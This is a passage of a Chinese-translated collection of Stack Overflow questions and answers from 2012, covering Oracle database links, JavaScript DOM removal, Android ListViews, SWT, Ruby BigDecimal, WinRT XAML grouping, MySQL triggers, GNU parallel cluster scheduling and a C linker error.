UPDATE temp_products tp
  SET technical_name=
    (SELECT technical_name FROM products@db1_link p
      WHERE tp.name = p.name) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T10:48:59.097

假设：

*   两`NAME`列都是`UNIQUE`；
*   你有一个指向的[数据库链接](http://docs.oracle.com/cd/B19306_01/server.102/b14200/statements_5005.htm)。`db2``db1`

```
UPDATE temp_products tp
  SET technical_name=
    (SELECT technical_name FROM products@db1 p
      WHERE tp=name=p.name) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-26T11:01:57.830

您需要在表所在的位置和同一数据库上的 db 链接中执行以下查询`db2`，以`temp_product`进行连接。`db1``db2``db1`

```
 MERGE temp_products tp
     USING products@db1 pp
     ON(tp.name = pp.name)
   WHEN MATCHED THEN
     UPDATE SET tp.technical_name = pp.technical_name; 
```

您需要在数据库 db2 中创建一个 db 链接，以便您可以连接到 db1 以访问产品表。请找到创建数据库链接的语法

```
CREATE [PUBLIC] DATABASE LINK <link_name>
CONNECT TO <user_name>
IDENTIFIED BY <password>
USING '<service_name>'; 
```

# javascript - 清除动态创建 ?

> ID：14039374
> 
> 赞同：0
> 
> 时间：2012-12-26T10:37:08.710
> 
> 标签：javascript, dom

我正在寻找一种跨浏览器的方式来`clear/remove/delete`动态创建 ul (with li-posts)-list。

这样创建：`document.createElement("ul");`

是否实现了真正的跨浏览器方法？

**编辑**：不允许使用 JQuery。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T10:40:22.310

```
// assuming you created your `ul` like this
var ul = document.createElement('ul');
document.body.appendChild(ul); 
```

如果您只想删除其内容

```
// removing only its content
ul.innerHTML = ""; 
```

或者您可以像这样删除元素和内容

```
// removing element and content
ul.parentNode.removeChild(ul); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:41:35.670

采用`removeChild`

```
var createdUL=document.createElement("ul"); 
createdUL.parentNode.removeChild(ul); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T10:42:27.557

似乎此链接可能对您有所帮助。但请记住，您的问题很容易理解，但您还必须发布一些代码来检查可能性。试试下面的链接。 [JavaScript DOM 移除元素](https://stackoverflow.com/questions/8830839/javascript-dom-remove-element)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-12-14T04:12:44.613

您可以如何使用[replaceChildren](https://developer.mozilla.org/en-US/docs/Web/API/ParentNode/replaceChildren)来完成此操作：

```
ul.replaceChildren(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-26T10:40:43.213

jQuery 删除？

```
$("ul").remove(); 
```

内容删除：

```
$("ul *").remove(); 
```

# android - imageloader 错误代替 url [位置]

> ID：14039378
> 
> 赞同：1
> 
> 时间：2012-12-26T10:37:41.770
> 
> 标签：android, json

我正在使用 imageloader 从 json 响应加载缩略图，有很多从 json 响应获得的图像需要解析并将图像放在列表视图中。我越来越混淆要添加什么来代替任何人帮助我找到解决方案的`url[position]`错误， `imgLoader.DisplayImage(url[position], loader, image);`这对我来说将是一个很大的帮助，您的回答将不胜感激。先感谢您。

以下是代码和json响应：

```
 public class AndroidLoadImageFromURLActivity extends ListActivity {

    // url to make request
   private static String desi = "http://website";

   // JSON Node names
   private static final String TAG_POSTS = "posts";
   private static final String TAG_ID = "id";
   private static final String TAG_TITLE = "title";
   private static final String TAG_DATE = "date";
   private static final String TAG_CONTENT = "content";
   private static final String TAG_AUTHOR = "author";
   private static final String TAG_NAME = "name";
   private static final String TAG_ATTACHMENTS = "attachments";
   private static final String TAG_IMAGES = "images";
   private static final String TAG_THUMBNAIL = "thumbnail";
   private static final String TAG_URL = "url";

   // contacts JSONArray
   JSONArray posts = null;

      @Override
        public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
          setContentView(R.layout.list_item);

        // Hashmap for ListView
    ArrayList<HashMap<String, String>> contactList = new ArrayList<HashMap<String, String>>();

     // Creating JSON Parser instance
    JSONParser jParser = new JSONParser();

    // getting JSON string from URL
    JSONObject json = jParser.getJSONFromUrl(desi);

    try {
        // Getting Array of Contacts
        posts = json.getJSONArray(TAG_POSTS);

        // looping through All Contacts
        for(int i = 0; i < posts.length(); i++){
            JSONObject c = posts.getJSONObject(i);

            // Storing each json item in variable
            String id = c.getString(TAG_ID);
            String title = c.getString(TAG_TITLE);
            String date = c.getString(TAG_DATE);
            String content = c.getString(TAG_CONTENT);
            // to remove all <P> </p> and <br /> and replace with ""
             content = content.replace("<br />", "");
             content = content.replace("<p>", "");
             content = content.replace("</p>", "");

            // Author is agin  JSON Object
            JSONObject author = c.getJSONObject(TAG_AUTHOR);
            String name = author.getString(TAG_NAME);

            JSONArray attachments = json.getJSONArray(TAG_ATTACHMENTS);

            for(int j = 0; j < attachments.length(); j++){
                JSONObject d = attachments.getJSONObject(i);

            JSONObject thumbnail = d.getJSONObject(TAG_THUMBNAIL);
            String url = thumbnail.getString(TAG_URL);
            }

            // creating new HashMap
        HashMap<String, String> map = new HashMap<String, String>();

            // adding each child node to HashMap key => value
            map.put(TAG_ID, id);
            map.put(TAG_TITLE, title);
            map.put( TAG_DATE, date);
            map.put( TAG_NAME, name);
            map.put( TAG_CONTENT, content);
            // adding HashList to ArrayList
            contactList.add(map);
        }   
    } catch (JSONException e) {
        e.printStackTrace();
    }

    /**
     * Updating parsed JSON data into ListView
     * */
    ListAdapter adapter = new SimpleAdapter(this, contactList,
            R.layout.list_row,
            new String[] { TAG_TITLE, TAG_DATE, TAG_NAME, TAG_CONTENT, TAG_URL },
        new int[] { R.id.name, R.id.email,R.id.mobile, R.id.content, R.id.list_image});

    setListAdapter(adapter);

          // Loader image - will be shown before loading image
           int loader = R.drawable.loader;

             // Imageview to show
          ImageView image = (ImageView) findViewById(R.id.list_image);

    // ImageLoader class instance
     ImageLoader imgLoader = new ImageLoader(getApplicationContext());

    // whenever you want to load an image from url
    // call DisplayImage function
    // url - image url to load
    // loader - loader image, will be displayed before getting image
    // image - ImageView 
    imgLoader.DisplayImage(url[position], loader, image);
    }
     } 
```

JSON 响应

```
{
"status": "ok",

"posts": [
    {
        "id": 2498,
        "title": "jigsaw lamp imported from thailand",
        "content": "<p>Hi. It&#8217;s a invitation to have a look at a unique lamp shade called jigsaw lamp from thailand. Available in multi attractive colours.</p>\n",
        "date": "2012-12-26 09:48:15",
         "author": {
            "name": "Tapas123456",
                        },
            "attachments": [
            {
                "description": "",
                "caption": "",
                "mime_type": "image/jpeg",
                "images": {

                    "thumbnail": {
                        "url": "http://site/wp-content/uploads/2012/12/646675-50x47.jpg",

                    }
                }
            },............... 
```

日志错误

```
12-26 16:53:26.154: E/AndroidRuntime(330): FATAL EXCEPTION: main
12-26 16:53:26.154: E/AndroidRuntime(330): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.androidhive.imagefromurl/com.androidhive.imagefromurl.AndroidLoadImageFromURLActivity}: java.lang.RuntimeException: Your content must have a ListView whose id attribute is 'android.R.id.list'
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2663)
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.app.ActivityThread.access$2300(ActivityThread.java:125)
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.os.Handler.dispatchMessage(Handler.java:99)
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.os.Looper.loop(Looper.java:123)
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.app.ActivityThread.main(ActivityThread.java:4627)
12-26 16:53:26.154: E/AndroidRuntime(330):  at java.lang.reflect.Method.invokeNative(Native Method)
12-26 16:53:26.154: E/AndroidRuntime(330):  at java.lang.reflect.Method.invoke(Method.java:521)
12-26 16:53:26.154: E/AndroidRuntime(330):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
12-26 16:53:26.154: E/AndroidRuntime(330):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
12-26 16:53:26.154: E/AndroidRuntime(330):  at dalvik.system.NativeStart.main(Native Method)
12-26 16:53:26.154: E/AndroidRuntime(330): Caused by: java.lang.RuntimeException: Your content must have a ListView whose id attribute is 'android.R.id.list'
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.app.ListActivity.onContentChanged(ListActivity.java:245)
12-26 16:53:26.154: E/AndroidRuntime(330):  at com.android.internal.policy.impl.PhoneWindow.setContentView(PhoneWindow.java:201)
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.app.Activity.setContentView(Activity.java:1647)
12-26 16:53:26.154: E/AndroidRuntime(330):  at com.androidhive.imagefromurl.AndroidLoadImageFromURLActivity.onCreate(AndroidLoadImageFromURLActivity.java:44)
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
12-26 16:53:26.154: E/AndroidRuntime(330):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2627) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:27:44.740

您已在 for 循环中将**url**变量声明为**String**

下面是你的代码..

```
for(int j = 0; j < attachments.length(); j++)
{
JSONObject d = attachments.getJSONObject(i);
JSONObject thumbnail = d.getJSONObject(TAG_THUMBNAIL);
String url = thumbnail.getString(TAG_URL);
} 
```

只需要将 url 声明`url`为全局

像下面的代码。

```
String url;
for(int j = 0; j < attachments.length(); j++)
    {
    JSONObject d = attachments.getJSONObject(i);
    JSONObject thumbnail = d.getJSONObject(TAG_THUMBNAIL);
    url = thumbnail.getString(TAG_URL);
    } 
```

并使用它`url`

```
imgLoader.DisplayImage(url, loader, image); 
```

# android - 在Android的列表视图中居中单击的项目

> ID：14039387
> 
> 赞同：2
> 
> 时间：2012-12-26T10:38:17.180
> 
> 标签：android, listview, center

我在屏幕左侧有一个列表视图，单击项目时我想更新屏幕右半部分的文本，我在这里要做的是将单击的项目移动到列表视图的中心。就像如果该项目在顶部并且我单击它它会自动移动到列表视图的中心，我该怎么做？任何形式的帮助将不胜感激。

我有一个列表视图，其中 7 个项目是可见的，并且在启动时将选择第 4 个项目，因为它位于列表视图中可见项目的中心，如果有 n 个项目并且用户选择的任何项目都将位于可见项目的中心在列表视图中。就像我有 10 个项目并且在开始时选择了第 4 个项目，当用户选择第 3 个项目时，listview 中的第 n 个项目应该到达索引零并且第 3 个项目将到达位置 4。对于每个其他选定的项目也是如此？任何人都可以为此提供代码片段吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:41:12.367

`ListView`更改源中的项目顺序`Array`，然后调用`notifyDataSetChanged()``ListView Adapter`

**编辑：**代码示例

```
 public class ListAdapter extends BaseAdapter{

    private Activity activity;
    private ArrayList<ListRowObject> listItems;

    public ListAdapter(Activity activity){
        this.activity = activity;
        listItems = new ArrayList<ListRowObject>();
    }

    public void addItem(ListRowObject item){
        listItems.add(item);
        notifyDataSetChanged();
    }

    public void addItems(ArrayList<ListRowObject> items){
        listItems = items;
        notifyDataSetChanged();
    }

    public void clear(){
        listItems = null;
        listItems = new ArrayList<ListRowObject>();
        notifyDataSetChanged();
    }

    @Override
    public int getCount() {
        return listItems.size();
    }

    @Override
    public Object getItem(int position) {
        return listItems.get(position);
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup viewGroup) {
        ViewHolder holder;

        if(convertView == null){
            holder = new ViewHolder();
            convertView = activity.getLayoutInflater().inflate(R.layout.list_row, null);
            holder.text = (TextView) convertView.findViewById(R.id.text);
            holder.bgLayout = (LinearLayout) convertView.findViewById(R.id.bgLayout);

            convertView.setTag(holder);
        }else{
            holder = (ViewHolder) convertView.getTag();
        }

        ListRowObject row = listItems.get(position);

        if(row.isSelected())
            holder.bgLayout.setBackgroundColor(Color.GRAY);
        else
            holder.bgLayout.setBackgroundColor(Color.WHITE);

        holder.text.setText(row.getText());

        return convertView;
    }
}

    //--------
    public class ListRowObject {
    private String text;
    private int positionInList;
    private boolean isSelected;

    public String getText() {
        return text;
    }

    public void setText(String text) {
        this.text = text;
    }

    public int getPositionInList() {
        return positionInList;
    }

    public void setPositionInList(int positionInList) {
        this.positionInList = positionInList;
    }

    public boolean isSelected() {
        return isSelected;
    }

    public void setSelected(boolean selected) {
        isSelected = selected;
    }
}

//------
public class Main extends Activity {

    private ListView listView;
    private ListAdapter adapter;
    private Activity activity;

    private ArrayList<ListRowObject> items;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        activity = this;

        initializeFormViews();
        initializeOnClickEvents();

        fillList();

    }

    private void initializeFormViews(){
        listView = (ListView) findViewById(R.id.listView);
    }

    private void initializeOnClickEvents(){
        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int position, long id) {
                Toast.makeText(activity, "Pressed " +position, Toast.LENGTH_SHORT).show();

                // unselect all rows
                for(ListRowObject item : items){
                    item.setSelected(false);
                }

                int first = adapterView.getFirstVisiblePosition();
                int last = adapterView.getLastVisiblePosition();

                int centerPosition = (first + last) / 2;

                // change bg for centerPosition row
                adapterView.getChildAt(centerPosition).findViewById(R.id.bgLayout).setBackgroundColor(Color.GRAY);
                changeItems(position, centerPosition);
            }
        });
    }

    private void changeItems(int pressedPosition, int centerPosition){
        ListRowObject centerRow = items.get(centerPosition);
        ListRowObject pressedRow = items.get(pressedPosition);
        pressedRow.setSelected(true);
        centerRow.setSelected(false);

        items.remove(centerPosition);
        items.add(centerPosition, pressedRow);

        items.remove(pressedPosition);
        items.add(pressedPosition, centerRow);

        adapter.clear();
        adapter.addItems(items);
    }

    private void fillList(){
        adapter = new ListAdapter(activity);
        items = new ArrayList<ListRowObject>();

        items = getItems();

        for(ListRowObject item : items){
            adapter.addItem(item);
        }

        listView.setAdapter(adapter);
    }

    private ArrayList<ListRowObject> getItems(){
        ArrayList<ListRowObject> result = new ArrayList<ListRowObject>();

        for(int i = 0; i < 15; i++){
            ListRowObject object = new ListRowObject();
            object.setPositionInList(i);
            object.setText("Item #" + i);

            if(i != 4)
                object.setSelected(false);
            else
                object.setSelected(true);

            result.add(object);
        }

        return result;
    }
}

//------
public class ViewHolder {
    public TextView text;
    public LinearLayout bgLayout;
} 
```

list_row.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
                          android:orientation="vertical"
                          android:layout_width="match_parent"
                          android:layout_height="50dp"
                          android:id="@+id/bgLayout">

        <TextView
                        android:layout_width="match_parent"
                        android:layout_height="50dp"
                        android:id="@+id/text"
                        android:textColor="#000000"
                        android:textSize="24dp"
                        android:gravity="center"/>
</LinearLayout> 
```

主要的.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
                          android:orientation="vertical"
                          android:layout_width="match_parent"
                          android:layout_height="match_parent">

        <ListView
                        android:layout_width="match_parent"
                        android:layout_height="match_parent"
                        android:id="@+id/listView"/>
</LinearLayout> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:46:12.690

当您为您的列表视图创建 ArrayAdapter 时，您会向它发送一个 ListArray。当您想要更改内容时。您只需更改此 listArray，然后单击您的项目时，您可以更改 ListArray 并调用 notifyDataSetChanged(); 方法你的适配器。

# java - 如何在 SWT 文本中设置光标位置

> ID：14039389
> 
> 赞同：8
> 
> 时间：2012-12-26T10:38:20.087
> 
> 标签：java, text, swt

我试图`Text`在附加字符串后将 SWT 的光标位置设置到末尾。我知道更改 SWT 的光标位置`StyledText`，但不确定 SWT `Text`。如果你们遇到了这个挑战并找到了解决方案，请分享它。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-12-26T10:56:56.200

看看[`Text#setSelection(int)`](http://help.eclipse.org/indigo/topic/org.eclipse.platform.doc.isv/reference/api/org/eclipse/swt/widgets/Text.html#setSelection(int))：

```
public static void main(String[] args)
{
    Display d = new Display();
    final Shell shell = new Shell(d);
    shell.setLayout(new GridLayout(1, false));

    Text text = new Text(shell, SWT.BORDER);

    text.setText("Some random text here...");

    text.setSelection(text.getText().length());

    shell.pack();
    shell.open();
    while (!shell.isDisposed())
        while (!d.readAndDispatch())
            d.sleep();
} 
```

这会将光标设置到末尾。

# ruby-on-rails - 转换为字符串后，bigdecimal 的精度如何变化？

> ID：14039390
> 
> 赞同：0
> 
> 时间：2012-12-26T10:38:31.367
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-2, ruby-1.8.7

我偶然发现了一个非常奇怪的行为。使用**to_s**方法转换为字符串时的正常 bigdecimal 值会改变其行为。

我的表中有一个正常的**浮点**列，记录的值为**37502**

当我使用

```
"some text "+ my_record.amount.to_s 
```

我得到的输出为

```
37502.0390625 
```

我对这种行为感到困惑

# c# - UserControl CollectionViewSource 不工作

> ID：14039399
> 
> 赞同：0
> 
> 时间：2012-12-26T10:38:54.953
> 
> 标签：c#, windows-runtime, winrt-xaml

我有一个包含此 XAML 的用户控件

```
<UserControl x:Class="QA.JobListControl" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:local="using:QA" xmlns:d="http://schemas.microsoft.com/expression/blend/2008" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="d" d:DesignHeight="300" d:DesignWidth="400">

   <UserControl.Resources>
      <CollectionViewSource x:Name="itemsSource" IsSourceGrouped="True" />
   </UserControl.Resources>

   <ListView x:Name="JobListView" Margin="-10,-10,0,0" Padding="120,0,0,60" IsSwipeEnabled="False" ItemsSource="{Binding Source=itemsSource}" SelectionChanged="JobListView_SelectionChanged" SelectionMode="Single">
      <ListView.GroupStyle>
         <GroupStyle>
            <GroupStyle.HeaderTemplate>
               <DataTemplate>
                  <Border HorizontalAlignment="Stretch">
                     <TextBlock Text='{Binding Status}' Margin="10" />
                  </Border>
               </DataTemplate>
            </GroupStyle.HeaderTemplate>
         </GroupStyle>
      </ListView.GroupStyle>
      <ListView.ItemTemplate>
         <DataTemplate>
            <StackPanel Margin="10">
               <TextBlock Text='{Binding TaskName}' />
               <TextBlock Text='{Binding DueDate}' />
            </StackPanel>
         </DataTemplate>
      </ListView.ItemTemplate>
   </ListView>
</UserControl> 
```

并设置我使用这个 C# 代码的内容

```
itemsSource.Source = Tasks.OrderBy(Tsk => Tsk.DueDate).GroupBy(Tsk => Tsk.Status); 
```

它显示了一些元素（但它们显示为空元素），而不是全部显示
可能出了什么问题？

如果我使用这个 C#-code 它正在工作（但它没有分组）

```
JobListView.ItemsSource = Tasks.OrderBy(Tsk => Tsk.DueDate); 
```

**更新**

添加`StaticResource`下面的内容后，它现在显示多个没有项目的组

```
ItemsSource="{Binding Source={StaticResource itemsSource}}" 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-27T18:20:29.457

所以我认为你误解了 GroupBy 方法背后的基础知识。GroupBy，与大多数其他 Linq 扩展相反，不会返回简单的对象列表，而是返回 IGrouping 列表。IGrouping 接口公开了一个 Key 属性，该属性将保存您在 GroupBy lambda 中传递的分组鉴别器的值。

因此，要让列表显示组名，您必须将组头模板绑定到 Key 而不是 Status。

```
<TextBlock Text='{Binding Key}' Margin="10" /> 
```

此外，如果将您的 CollectionViewSource 作为资源引用，则需要定义一个资源键，以便稍后在 XAML 中将其作为静态资源引用。

```
<CollectionViewSource x:Name="itemsSource" x:Key="groupedTasks" IsSourceGrouped="True" /> 
```

并在列表视图中。

```
<ListView x:Name="JobListView" ItemsSource="{Binding Source={StaticResource groupedTasks}}"> 
```

这样我就可以让您的示例按预期工作。

作为补充阅读，我强烈建议您阅读Sergei Barskiy 的[这篇文章](http://dotnetspeak.com/index.php/2012/07/working-with-gridview-control-in-winrt-app/)，该文章演示了如何在 XAML 列表中使用分组，还提供了一个 GroupedData 类，在我看来，它比默认的 IGrouping 对象更好地公开数据并在其中使用它用户界面。

# mysql - 如何使用 MySQL 触发器生成顺序用户代码？

> ID：14039402
> 
> 赞同：0
> 
> 时间：2012-12-26T10:39:10.777
> 
> 标签：mysql, triggers

我在表名 agent_mst 上**创建了一个 MySQL 触发器，****如下**所示

```
BEGIN
    DECLARE max_id INT;

    SET max_id=(SELECT MAX(agent_id_pk)+1 FROM `agent_mst`);
    IF (max_id IS NULL) THEN
        SET max_id=1;
    END IF;

    SET NEW.date_added=NOW(),
        NEW.date_updated=NOW(),
        NEW.agent_code = CONCAT('SDA', LPAD(max_id, 4,'0'));

END 
```

所以它的作用是，每次我们插入一条记录时，它都会生成 agent_code 字段值，例如**SDA0001、SDA0002、SDA0003 ......**

现在假设我删除一条代码为**SDA0003**的记录并插入新记录，它肯定会生成代理代码为**SDA0004**。因为它正在使用**max_id**并将其增加 1。但在这里我想再次获得**SDA0003**。这样所有的**agent_codes**都可以保持顺序。怎么做？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:01:31.950

you need to identify the first (smallest) missing id. check out in this link, a nice way to do it in a select query: [Find mininum not used value in mysql table](https://stackoverflow.com/questions/6464656/find-mininum-not-used-value-in-mysql-table)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:48:54.843

要知道下一个自动增量 ID，请尝试在查询下方运行并检查“Auto_increment”列：

```
SHOW TABLE STATUS FROM DBName where name = 'tableName' 
```

# linux - GNU 并行负载均衡

> ID：14039403
> 
> 赞同：4
> 
> 时间：2012-12-26T10:39:13.913
> 
> 标签：linux, bash, parallel-processing, cluster-computing, gnu-parallel

我正在尝试找到一种在集群上执行 CPU 密集型并行作业的方法。我的目标是为每个内核安排一个作业，以便每个作业在安排后都有望获得 100% 的 CPU 利用率。这是迄今为止提出的：

文件 build_sshlogin.sh

```
#!/bin/bash

serverprefix="compute-0-"
lastserver=15
function worker {
    server="$serverprefix$1"; 
    free=$(ssh $server /bin/bash << 'EOF'
        cores=$(grep "cpu MHz" /proc/cpuinfo | wc -l)
        stat=$(head -n 1 /proc/stat)
        work1=$(echo $stat | awk '{print $2+$3+$4;}')
        total1=$(echo $stat | awk '{print $2+$3+$4+$5+$6+$7+$8;}')
        sleep 2;
        stat=$(head -n 1 /proc/stat)
        work2=$(echo $stat | awk '{print $2+$3+$4;}')
        total2=$(echo $stat | awk '{print $2+$3+$4+$5+$6+$7+$8;}')

        util=$(echo " ( $work2 - $work1 ) / ($total2 - $total1) " | bc -l );
        echo " $cores * (1 - $util) " | bc -l | xargs printf "%1.0f"
    EOF
    )

    if [ $free -gt 0 ] 
    then 
        echo $free/$server
    fi
}

export serverprefix
export -f worker

seq 0 $lastserver | parallel -k worker {} 
```

该脚本由 GNU 并行使用，如下所示：

```
parallel --sshloginfile <(./build_sshlogin.sh) --workdir $PWD command args {1} :::  $(seq $runs) 
```

这种技术的问题是，如果有人在集群中的服务器上启动另一个 CPU 密集型作业，而不检查 CPU 使用情况，那么脚本最终会将作业调度到正在使用的核心。此外，如果在第一个作业完成时 CPU 使用率发生了变化，那么新释放的内核将不会被 GNU 并行调度用于剩余作业。

所以我的问题如下：**有没有办法让 GNU 在调度每个作业之前并行重新计算空闲内核/服务器？**欢迎任何其他解决问题的建议。

注意：在我的集群中，所有核心都具有相同的频率。如果有人可以概括以解释不同的频率，那也是受欢迎的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-27T11:41:31.500

看看`--load`哪个是针对这种情况的。

不幸的是，它不查看 CPU 利用率，而是查看平均负载。但是，如果您的集群节点没有大量的磁盘 I/O，那么 CPU 利用率将非常接近负载平均值。

由于平均负载变化缓慢，您可能还需要使用新`--delay`选项给平均负载上升时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T23:32:13.970

试试 mpstat

```
mpstat
Linux 2.6.32-100.28.5.el6.x86_64 (dev-db)       07/09/2011

10:25:32 PM  CPU   %user   %nice    %sys %iowait    %irq   %soft  %steal   %idle    intr/s
10:25:32 PM  all    5.68    0.00    0.49    2.03    0.01    0.02    0.00   91.77    146.55 
```

这是基于每个核心的整体快照

```
$ mpstat -P ALL
Linux 2.6.32-100.28.5.el6.x86_64 (dev-db)       07/09/2011      _x86_64_        (4 CPU)

10:28:04 PM  CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest   %idle
10:28:04 PM  all    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00   99.99
10:28:04 PM    0    0.01    0.00    0.01    0.01    0.00    0.00    0.00    0.00   99.98
10:28:04 PM    1    0.00    0.00    0.01    0.00    0.00    0.00    0.00    0.00   99.98
10:28:04 PM    2    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00
10:28:04 PM    3    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00 
```

有很多选项，这两个给出了一个简单的实际 %idle per cpu。检查手册页。

# c - 编译/链接时的多个定义

> ID：14039406
> 
> 赞同：-1
> 
> 时间：2012-12-26T10:39:34.680
> 
> 标签：c

> **可能的重复：**
> [在多个 cpps 中包含相同的标头导致重复的多个定义错误](https://stackoverflow.com/questions/223771/repeated-multiple-definition-errors-from-including-same-header-in-multiple-cpps)

编译第三方 src 时遇到以下错误：

```
.libs/lib_udf_la-udf.o:(.rodata+0x240): multiple definition of `SHIFT_TABLE'
.libs/lib_udf_la-hll.o:(.rodata+0x0): first defined here 
```

该项目是使用自动工具设置的；我的`Makefile.ag`参考如下：

```
SOURCES = hll.c udf.c udf.h 
```

*   hll.c 引用 hll.h
*   udf.c 引用 hll.h
*   hll.h 有一些`const`这样的：
*   hll.h`#ifndef HLL_H ... #endif`可以避免双重定义

    int const SHIFT_TABLE[1024] = {...}

我不明白为什么我要打多个定义，我猜它与链接步骤有关，但自从我涉足 C 以来已经有很长时间了。

这是 cc/link 输出供参考：

```
make[1]: Entering directory `/home/mping/workspace/monetdb/MonetDB-11.13.5/sql/backends/monet5/UDF'
/bin/bash ../../../../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I../../../..  -I. -I.. -I./.. -I../../../include -I./../../../include -I../../../common -I./../../../common -I../../../storage -I./../../../storage -I../../../server -I./../../../server -I../../../../monetdb5/modules/atoms -I./../../../../monetdb5/modules/atoms -I../../../../monetdb5/modules/kernel -I./../../../../monetdb5/modules/kernel -I../../../../monetdb5/mal -I./../../../../monetdb5/mal -I../../../../monetdb5/modules/mal -I./../../../../monetdb5/modules/mal -I../../../../monetdb5/optimizer -I./../../../../monetdb5/optimizer -I../../../../clients/mapilib -I./../../../../clients/mapilib -I../../../../common/options -I./../../../../common/options -I../../../../common/stream -I./../../../../common/stream -I../../../../gdk -I./../../../../gdk  -DLIBUDF  -g -O2   -c -o lib_udf_la-hll.lo `test -f 'hll.c' || echo './'`hll.c
libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../../../.. -I. -I.. -I./.. -I../../../include -I./../../../include -I../../../common -I./../../../common -I../../../storage -I./../../../storage -I../../../server -I./../../../server -I../../../../monetdb5/modules/atoms -I./../../../../monetdb5/modules/atoms -I../../../../monetdb5/modules/kernel -I./../../../../monetdb5/modules/kernel -I../../../../monetdb5/mal -I./../../../../monetdb5/mal -I../../../../monetdb5/modules/mal -I./../../../../monetdb5/modules/mal -I../../../../monetdb5/optimizer -I./../../../../monetdb5/optimizer -I../../../../clients/mapilib -I./../../../../clients/mapilib -I../../../../common/options -I./../../../../common/options -I../../../../common/stream -I./../../../../common/stream -I../../../../gdk -I./../../../../gdk -DLIBUDF -g -O2 -c hll.c  -fPIC -DPIC -o .libs/lib_udf_la-hll.o
/bin/bash ../../../../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I../../../..  -I. -I.. -I./.. -I../../../include -I./../../../include -I../../../common -I./../../../common -I../../../storage -I./../../../storage -I../../../server -I./../../../server -I../../../../monetdb5/modules/atoms -I./../../../../monetdb5/modules/atoms -I../../../../monetdb5/modules/kernel -I./../../../../monetdb5/modules/kernel -I../../../../monetdb5/mal -I./../../../../monetdb5/mal -I../../../../monetdb5/modules/mal -I./../../../../monetdb5/modules/mal -I../../../../monetdb5/optimizer -I./../../../../monetdb5/optimizer -I../../../../clients/mapilib -I./../../../../clients/mapilib -I../../../../common/options -I./../../../../common/options -I../../../../common/stream -I./../../../../common/stream -I../../../../gdk -I./../../../../gdk  -DLIBUDF  -g -O2   -c -o lib_udf_la-udf.lo `test -f 'udf.c' || echo './'`udf.c
libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../../../.. -I. -I.. -I./.. -I../../../include -I./../../../include -I../../../common -I./../../../common -I../../../storage -I./../../../storage -I../../../server -I./../../../server -I../../../../monetdb5/modules/atoms -I./../../../../monetdb5/modules/atoms -I../../../../monetdb5/modules/kernel -I./../../../../monetdb5/modules/kernel -I../../../../monetdb5/mal -I./../../../../monetdb5/mal -I../../../../monetdb5/modules/mal -I./../../../../monetdb5/modules/mal -I../../../../monetdb5/optimizer -I./../../../../monetdb5/optimizer -I../../../../clients/mapilib -I./../../../../clients/mapilib -I../../../../common/options -I./../../../../common/options -I../../../../common/stream -I./../../../../common/stream -I../../../../gdk -I./../../../../gdk -DLIBUDF -g -O2 -c udf.c  -fPIC -DPIC -o .libs/lib_udf_la-udf.o
